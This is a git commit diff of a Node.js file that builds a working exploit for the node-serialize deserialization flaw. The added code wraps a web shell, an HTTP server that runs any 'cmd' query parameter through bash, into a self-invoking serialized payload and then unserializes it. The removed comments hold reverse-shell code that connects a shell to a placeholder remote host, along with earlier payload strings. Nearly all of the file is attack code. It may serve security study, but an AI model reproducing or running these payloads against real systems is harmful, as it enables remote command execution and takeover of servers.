2e6ef048ca1934b846d805f9682212b3c3a8c224
ChrisJeong <crowjdh@gmail.com>
2021-06-04 21:57:42 +0900

    Generate web shell code automatically

--- app.js
+++ app.js
@@ -1,56 +1,40 @@
 const serialize = require('node-serialize');
-// var x = '{"rce":"_$$ND_FUNC$$_function (){console.log(\'exploited\')}()"}'
-// serialize.unserialize(x);
 
-// const webShell = function(){
-//   var net = require("net"),
-//     cp = require("child_process"),
-//     sh = cp.spawn("/bin/sh",[]);
-//   var client = new net.Socket();
-//   client.connect(8888,"xxx.xxx.xxx.xxx",function(){
-//     client.pipe(sh.stdin);
-//     sh.stdout.pipe(client);
-//     sh.stderr.pipe(client);
-//   });
-//   return /a/;
-// };
-
-// const webShell = function () {
-//   var sys   = require('sys'),
-//       exec  = require('child_process').exec,
-//       child,
-//       http = require('http');
+const webShell = function () {
+  const sys = require('sys');
+  const exec = require('child_process').exec;
+  const http = require('http');
+  const url = require('url');
       
-//   child = function(res, cmd) {
-//     exec('bash -c "' + cmd + '"', 
-//     function (error, stdout, stderr) {
-//       res.end(stdout);
-//       if (error !== null) {
-//         console.log('exec error: ' + error);
-//       }
-//     });
-//   };
+  const child = function(res, cmd) {
+    exec(
+      cmd,
+      {shell: '/bin/bash'},
+      function (error, stdout, stderr) {
+        res.end(stdout);
+        if (error !== null) {
+          console.log('exec error: ' + error);
+        }
+      });
+  };
 
-//   http.createServer(function (req, res) {
-//     res.writeHead(200, {'Content-Type': 'text/plain'});
-//     var parsedRequest = require('url').parse(req.url, true);
-//     var cmd = parsedRequest.query['cmd'];
-//     if (cmd != undefined)
-//     {
-//       console.log("[cmd] " + cmd);
-//       child(res, cmd);
-//     }
-//   }).listen('6660', '127.0.0.1');
-// }
+  http.createServer(function (req, res) {
+    res.writeHead(200, {'Content-Type': 'text/plain'});
 
-// const input = { 'asdf': webShell };
-// const serialized = serialize.serialize(input);
-// console.log(serialized);
+    let parsedRequest = url.parse(req.url, true);
+    let cmd = parsedRequest.query['cmd'];
+    if (cmd !== undefined) {
+      console.log('[cmd] ' + cmd);
+      child(res, cmd);
+    }
+  }).listen('6660', '127.0.0.1');
+};
 
-// const serialized = '{"asdf":"_$$ND_FUNC$$_function() { console.log(\'Do it\'); }()"}';
-// const serialized = '{"asdf":"_$$ND_FUNC$$_function(){  var net = require(\'net\'),    cp = require(\'child_process\'),    sh = cp.spawn(\'/bin/sh\',[]);  var client = new net.Socket();  client.connect(8888,\'127.0.0.1\',function(){    client.pipe(sh.stdin);    sh.stdout.pipe(client);    sh.stderr.pipe(client);  });  return /a/;}()"}';
-// const serialized = '{"asdf":"_$$ND_FUNC$$_function () {  var sys   = require(\'sys\'),      exec  = require(\'child_process\').exec,      child,      http = require(\'http\');        child = function(res, cmd) {    exec(\'bash -c \"\' + cmd + \'\',     function (error, stdout, stderr) {      res.end(stdout);      if (error !== null) {        console.log(\'exec error: \' + error);      }    });  };  http.createServer(function (req, res) { console.log(\'asdf\');   res.writeHead(200, {\'Content-Type\': \'text/plain\'});    var parsedRequest = require(\'url\').parse(req.url, true);    console.log(parsedRequest.query); var cmd = parsedRequest.query[\'cmd\'];    if (cmd != undefined)    {      console.log(\'[cmd] \' + cmd);      child(res, cmd);    }  }).listen(\'6660\', \'127.0.0.1\');}()"}';
-const serialized = '{"asdf":"_$$ND_FUNC$$_function () {  var sys   = require(\'sys\'),      exec  = require(\'child_process\').exec,      child,      http = require(\'http\');        child = function(res, cmd) {    exec(cmd, {shell: \'/bin/bash\'},     function (error, stdout, stderr) {      res.end(stdout);      if (error !== null) {        console.log(\'exec error: \' + error);      }    });  };  http.createServer(function (req, res) { console.log(req.url);   res.writeHead(200, {\'Content-Type\': \'text/plain\'});    var parsedRequest = require(\'url\').parse(req.url, true);    var cmd = parsedRequest.query[\'cmd\'];    if (cmd != undefined)    {      console.log(\'[cmd] \' + cmd);      child(res, cmd);    }  }).listen(\'6660\', \'127.0.0.1\');}()"}';
-// console.log(serialized)
+const input = { 'asdf': webShell };
+
+let serialized = serialize.serialize(input);
+serialized = serialized.replace(/\\n|/g, '');
+serialized = serialized.substring(0, serialized.length - 2) + '()' + serialized.substring(serialized.length - 2);
+// const serialized = `{"asdf":"_$$ND_FUNC$$_function () {  const sys = require('sys');  const exec = require('child_process').exec;  const http = require('http');  const url = require('url');        const child = function(res, cmd) {    exec(      cmd,      {shell: '/bin/bash'},      function (error, stdout, stderr) {        res.end(stdout);        if (error !== null) {          console.log('exec error: ' + error);        }      });  };  http.createServer(function (req, res) {    res.writeHead(200, {'Content-Type': 'text/plain'});    let parsedRequest = url.parse(req.url, true);    let cmd = parsedRequest.query['cmd'];    if (cmd !== undefined) {      console.log('[cmd] ' + cmd);      child(res, cmd);    }  }).listen('6660', '127.0.0.1');}()"}`;
+
 const unserialized = serialize.unserialize(serialized);
-console.log(unserialized);
